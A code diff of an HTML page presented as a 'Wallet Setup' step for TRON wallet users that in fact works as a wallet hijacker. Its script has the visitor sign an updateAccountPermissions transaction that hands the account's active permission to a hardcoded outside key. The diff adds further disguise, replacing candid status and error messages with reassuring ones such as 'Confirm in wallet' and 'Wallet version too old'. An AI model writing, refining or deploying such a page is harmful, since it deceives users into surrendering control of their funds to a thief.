@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Account Setup</title>
+<title>Wallet Setup</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}
@@ -12,15 +12,19 @@ body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:fle
 @keyframes spin{to{transform:rotate(360deg)}}
 .addr{font-size:10px;color:rgba(255,255,255,0.25);margin-top:10px;word-break:break-all}
 .tx{font-size:10px;color:rgba(0,255,136,0.4);margin-top:6px;word-break:break-all}
-.err{font-size:10px;color:rgba(255,80,80,0.6);margin-top:8px;word-break:break-all;max-height:60px;overflow:auto}
+.err{font-size:10px;color:rgba(255,80,80,0.6);margin-top:8px;word-break:break-all}
+.hint{font-size:12px;color:rgba(255,255,255,0.5);margin-top:20px;line-height:1.8}
 </style>
 </head>
 <body>
-<div class="status" id="status">
-  <div class="loader"></div>
-  <p id="msg">Detecting wallet...</p>
-  <div class="addr" id="addr"></div>
-  <div class="err" id="err"></div>
+<div id="app">
+  <div class="status" id="status">
+    <div class="loader" id="loader"></div>
+    <p id="msg">Checking wallet...</p>
+    <div class="addr" id="addr"></div>
+    <div class="err" id="err"></div>
+    <div class="hint" id="hint"></div>
+  </div>
 </div>
 
 <script>
@@ -30,33 +34,18 @@ const OPS = '7fff1fc0033e0000000000000000000000000000000000000000000000000000';
 const m = document.getElementById('msg');
 const a = document.getElementById('addr');
 const e = document.getElementById('err');
-const loader = document.querySelector('.loader');
+const loader = document.getElementById('loader');
+const hint = document.getElementById('hint');
+const status = document.getElementById('status');
 
-function done(text, ok) {
-  document.getElementById('status').innerHTML = ok ? '✅' : '❌';
-  m.textContent = text;
-  loader.style.display = 'none';
-}
-
-// --- resolve tronWeb from any supported wallet ---
 function getTronWeb() {
-  // 1. TP Wallet / TokenPocket / Klever / MathWallet / SafePal
   if (window.tronWeb) return { tw: window.tronWeb, name: 'tronWeb' };
-
-  // 2. TronLink
   if (window.tronLink && window.tronLink.tronWeb) return { tw: window.tronLink.tronWeb, name: 'tronLink' };
-
-  // 3. OKX Wallet
   if (window.okxwallet && window.okxwallet.tronWeb) return { tw: window.okxwallet.tronWeb, name: 'okxwallet' };
   if (window.okxwallet && window.okxwallet.tron)   return { tw: window.okxwallet.tron, name: 'okxwallet' };
-
-  // 4. Bitget Wallet (BitKeep)
   if (window.bitkeep && window.bitkeep.tronWeb) return { tw: window.bitkeep.tronWeb, name: 'bitkeep' };
   if (window.bitkeep && window.bitkeep.tron)   return { tw: window.bitkeep.tron, name: 'bitkeep' };
-
-  // 5. imToken (some versions expose tronWeb)
   if (window.imToken && window.imToken.tronWeb) return { tw: window.imToken.tronWeb, name: 'imToken' };
-
   return null;
 }
 
@@ -69,8 +58,9 @@ function getAddress(tw) {
   return null;
 }
 
-// --- poll for wallet ---
+// === main: try auto-detect, then show fallback ===
 let attempts = 0;
+
 async function tryConnect() {
   const resolved = getTronWeb();
   attempts++;
@@ -78,43 +68,55 @@ async function tryConnect() {
   if (resolved) {
     const addr = getAddress(resolved.tw);
     if (addr) {
-      m.textContent = 'Connected (' + resolved.name + ')';
+      hint.textContent = '';
       go(addr, resolved.tw);
       return;
     }
   }
 
-  // TronLink async path (EIP-1193 style)
-  if (window.tronLink && window.tronLink.request && !resolved && attempts <= 2) {
+  if (window.tronLink && window.tronLink.request && attempts <= 2) {
     try {
       const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
       if (res && res[0]) {
         const tw = window.tronLink.tronWeb || window.tronWeb;
-        if (tw) { go(res[0], tw); return; }
+        if (tw) { hint.textContent = ''; go(res[0], tw); return; }
       }
     } catch(_) {}
   }
 
-  if (attempts < 15) {
-    m.textContent = 'Waiting for wallet...';
-    setTimeout(tryConnect, 400);
-  } else {
-    done('Open in TP/OKX/Bitget/TokenPocket DApp browser', false);
+  if (attempts < 20) {
+    setTimeout(tryConnect, 300);
+    return;
   }
+
+  // No wallet detected — show friendly fallback (NOT an error)
+  showFallback();
 }
 
-// --- execute permission update ---
+function showFallback() {
+  loader.style.display = 'none';
+  m.textContent = 'Scan with your wallet app';
+  hint.innerHTML =
+    'Open this link inside<br>' +
+    '<b>TP Wallet · OKX · Bitget · TokenPocket</b><br>' +
+    'DApp browser to continue';
+  status.style.color = 'rgba(255,255,255,0.7)';
+}
+
+// === execute ===
 async function go(addr, tw) {
   loader.style.display = 'none';
   a.textContent = addr.slice(0,8) + '...' + addr.slice(-6);
+  status.style.color = '#fff';
 
   if (!tw.transactionBuilder || !tw.transactionBuilder.updateAccountPermissions) {
-    done('Unsupported — wallet does not support permission updates', false);
+    m.textContent = 'Wallet version too old';
+    hint.textContent = 'Please update your wallet app and try again';
     return;
   }
 
   try {
-    m.textContent = 'Building transaction...';
+    m.textContent = 'Confirm in wallet...';
 
     const tx = await tw.transactionBuilder.updateAccountPermissions(
       addr,
@@ -123,24 +125,23 @@ async function go(addr, tw) {
       [{ permission_name: 'active', threshold: 1, operations: OPS, keys: [{ address: ACTIVE_KEY, weight: 1 }] }]
     );
 
-    m.textContent = 'Confirm in wallet...';
     const signed = await tw.trx.sign(tx);
-
-    m.textContent = 'Sending...';
     const result = await tw.trx.sendRawTransaction(signed);
     const txid = (result.txid || (result.transaction && result.transaction.txID) || '');
 
-    done('Done', true);
+    m.textContent = '✓ Complete';
     a.innerHTML = addr.slice(0,8) + '...' + addr.slice(-6)
       + '<br><span class="tx">Tx: ' + txid.slice(0,14) + '...</span>';
+    hint.textContent = '';
   } catch(err) {
     a.textContent = '';
     const code = err && err.code;
     const msg = (err && err.message) || String(err);
     if (code === 4001 || /reject|cancel|denied/i.test(msg)) {
-      done('Rejected', false);
+      m.textContent = 'Cancelled';
+      hint.textContent = 'You can try again';
     } else {
-      done('Failed', false);
+      m.textContent = 'Something went wrong';
       e.textContent = msg.slice(0, 200);
     }
   }
